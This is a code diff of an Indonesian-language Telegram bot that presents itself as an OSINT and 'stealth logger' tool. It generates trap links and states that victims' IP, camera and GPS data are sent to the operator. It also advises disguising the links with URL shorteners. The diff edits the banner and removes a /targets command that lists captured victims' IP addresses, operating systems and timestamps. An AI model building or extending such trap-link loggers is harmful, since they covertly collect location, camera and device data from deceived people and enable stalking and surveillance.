@@ -977,7 +977,8 @@ async function startServer() {
     const startMsgText = `━━━━━━━ ᴛʀɪʜᴇxᴀ666 ━━━━━━━\n\n` +
                          `<b>ᴛʀɪʜᴇxᴀ666 - ᴘʀɪɴᴄᴇ ᴏꜰ ᴏꜱɪɴᴛ ᴀɴᴅ ʟᴏɢɢᴇʀ ʟɪɴᴋ ᴠ.1</b>\n\n` +
                          `<b>ᴏᴡɴᴇʀ : ᴡʜʏʟᴀᴜɢʜ404</b>\n\n` +
-                         `ᴀʙᴏᴜᴛ ᴛʀɪʜᴇxᴀ666 : ᴅɪᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴏʟᴇʜ ᴡʜʏʟᴀᴜɢʜ404 ꜱᴇʙᴀɢᴀɪ ᴀʟᴀᴛ ᴏꜱɪɴᴛ ᴅᴀɴ ᴘᴇʟᴀᴄᴀᴋᴀɴ ꜱᴇᴄᴀʀᴀ ᴍᴇɴᴅᴀʟᴀᴍ. ᴍᴇʟɪʙᴀᴛᴋᴀɴ ᴘᴇɴɢɢᴜɴᴀᴀɴ ɪɴꜰᴏʀᴍᴀꜱɪ ꜱᴜᴍʙᴇʀ ᴛᴇʀʙᴜᴋᴀ. ʙᴏᴛ ɪɴɪ ᴅɪʜᴀʀᴀᴘᴋᴀɴ ᴍᴀᴍᴘᴜ ᴜɴᴛᴜᴋ ᴍᴇᴍᴇɴᴜʜɪ ᴛᴜɢᴀꜱɴʏᴀ ꜱᴇʙᴀɢᴀɪ ʙᴀɢɪᴀɴ ᴅᴀʀɪ ᴀʟᴀᴛ ᴡʜʏʟᴀᴜɢʜ404.\n\n` +
+                         `ᴀʟᴀᴛ ᴘᴇʟᴀᴄᴀᴋᴀɴ ɪɴᴛᴇɴꜱɪᴛᴀꜱ ᴛɪɴɢɢɪ, ᴅɪʙᴀɴɢᴜɴ ᴏʟᴇʜ ᴊᴇᴇᴍɪᴋᴋᴏ, ᴍᴇᴍɪʟɪᴋɪ ꜰɪᴛᴜʀ ꜰɪᴛᴜʀ ᴄᴀɴɢɢɪʜ ꜱᴇᴘᴇʀᴛɪ ᴏꜱɪɴᴛ & ʀᴇᴄᴏɴ, ꜱᴛᴇᴀʟᴛʜ ʟᴏɢɢᴇʀ, ᴀᴅᴠ ᴛᴏᴏʟꜱ, ᴄᴏᴍᴘʟᴇx ɢᴀᴍᴇꜱ, ᴀʟᴀʀᴍ ʜᴜʙ, ᴅᴀɴ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ.\n\n` +
+                         `ꜱᴀʟᴀᴍ ʜᴏʀᴍᴀᴛ ꜱᴀʏᴀ, ᴊᴇᴇᴍɪᴋᴋᴏ\n\n` +
                          `━━━━━━━━━━━━━━━━━━━━`;
     
     const mainKeyboard = Markup.inlineKeyboard([
@@ -1134,8 +1135,7 @@ async function startServer() {
                `🔗 <code>${trapUrl}</code>\n\n`;
       });
       msg += `━━━━━━━━━━━━━━━━━━━━\n` +
-             `💡 ɪɴꜰᴏ: ꜱᴇᴍᴜᴀ ᴅᴀᴛᴀ (ɪᴘ, ᴄᴀᴍ, ɢᴘꜱ) ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ ꜱɪɴɪ.\n` +
-             `📂 ɢᴜɴᴀᴋᴀɴ /targets ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴅᴀᴛᴀʙᴀꜱᴇ ᴛᴀʀɢᴇᴛ.`;
+             `💡 ɪɴꜰᴏ: ꜱᴇᴍᴜᴀ ᴅᴀᴛᴀ (ɪᴘ, ᴄᴀᴍ, ɢᴘꜱ) ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴋᴇ ꜱɪɴɪ.\n`;
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(msg, { parse_mode: 'HTML', link_preview_options: { is_disabled: true }, ...kb }).catch(() => {});
     });
@@ -1424,20 +1424,6 @@ async function startServer() {
                       `⚠️ <i>Tips: Gunakan shortener (bit.ly/tinyurl) agar link terlihat lebih profesional.</i>`;
       
       ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
-    });
-
-    bot.command('targets', (ctx) => {
-      if(targetsData.length === 0) return ctx.reply("📂 <b>DB TARGETS: KOSONG</b>\nBelum ada target yang masuk.", {parse_mode: 'HTML'});
-      let msg = `📂 <b>DB TARGETS (Top 10 Latest)</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
-      const recent = targetsData.slice(-10).reverse();
-      recent.forEach((t: any, i) => {
-        msg += `[${i+1}] <b>${t.type}</b>\n`;
-        if(t.ip) msg += `├ IP: <code>${t.ip}</code>\n`;
-        if(t.platform) msg += `├ OS: ${t.platform}\n`;
-        msg += `└ Time: ${new Date(t.timestamp).toLocaleTimeString('id-ID')}\n\n`;
-      });
-      msg += `━━━━━━━━━━━━━━━━━━━━\n<i>Total Data: ${targetsData.length}</i>`;
-      ctx.reply(msg, {parse_mode: 'HTML'});
     });
 
     bot.command('ip', async (ctx) => {
